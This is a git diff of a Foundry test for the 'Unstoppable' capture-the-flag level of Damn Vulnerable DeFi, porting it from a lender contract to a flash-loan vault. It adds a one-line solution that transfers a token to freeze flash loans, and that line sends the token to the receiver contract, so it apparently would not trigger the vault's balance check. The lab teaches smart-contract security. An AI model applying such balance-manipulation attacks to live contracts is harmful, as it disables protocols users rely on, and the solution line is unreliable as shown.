@@ -5,17 +5,18 @@ import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
-import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
+import {UnstoppableVault} from "../../../src/Contracts/unstoppable/UnstoppableVault.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
 
 contract Unstoppable is Test {
-    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
-    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;
+    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
+    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 10e18;
 
     Utilities internal utils;
-    UnstoppableLender internal unstoppableLender;
+    UnstoppableVault internal unstoppableVault;
     ReceiverUnstoppable internal receiverUnstoppable;
     DamnValuableToken internal dvt;
+    address payable internal deployer;
     address payable internal attacker;
     address payable internal someUser;
 
@@ -25,33 +26,42 @@ contract Unstoppable is Test {
          */
 
         utils = new Utilities();
-        address payable[] memory users = utils.createUsers(2);
-        attacker = users[0];
-        someUser = users[1];
+        address payable[] memory users = utils.createUsers(3);
+        deployer = users[0];
+        attacker = users[1];
+        someUser = users[2];
+        vm.label(deployer, "Deployer");
         vm.label(someUser, "User");
         vm.label(attacker, "Attacker");
 
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
 
-        unstoppableLender = new UnstoppableLender(address(dvt));
-        vm.label(address(unstoppableLender), "Unstoppable Lender");
+        unstoppableVault = new UnstoppableVault(dvt, deployer, deployer);
+        vm.label(address(unstoppableVault), "Unstoppable Lender");
 
-        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
-        unstoppableLender.depositTokens(TOKENS_IN_POOL);
+        dvt.approve(address(unstoppableVault), TOKENS_IN_VAULT);
+        unstoppableVault.deposit(TOKENS_IN_VAULT, deployer);
+
+        assertEq(dvt.balanceOf(address(unstoppableVault)), TOKENS_IN_VAULT);
+        assertEq(unstoppableVault.totalAssets(), TOKENS_IN_VAULT);
+        assertEq(unstoppableVault.totalSupply(), TOKENS_IN_VAULT);
+        assertEq(unstoppableVault.maxFlashLoan(address(dvt)), TOKENS_IN_VAULT);
+        assertEq(unstoppableVault.flashFee(address(dvt), TOKENS_IN_VAULT - 1), 0);
+        assertEq(unstoppableVault.flashFee(address(dvt), TOKENS_IN_VAULT), 50000 * 10 ** 18);
 
         dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);
 
-        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
+        assertEq(dvt.balanceOf(address(unstoppableVault)), TOKENS_IN_VAULT);
         assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);
 
         // Show it's possible for someUser to take out a flash loan
         vm.startPrank(someUser);
         receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
+            address(unstoppableVault)
         );
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(100 * 10 ** 18);
         vm.stopPrank();
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
@@ -60,10 +70,11 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        dvt.transfer(address(receiverUnstoppable), 1);
         /**
          * EXPLOIT END *
          */
-        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
+        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
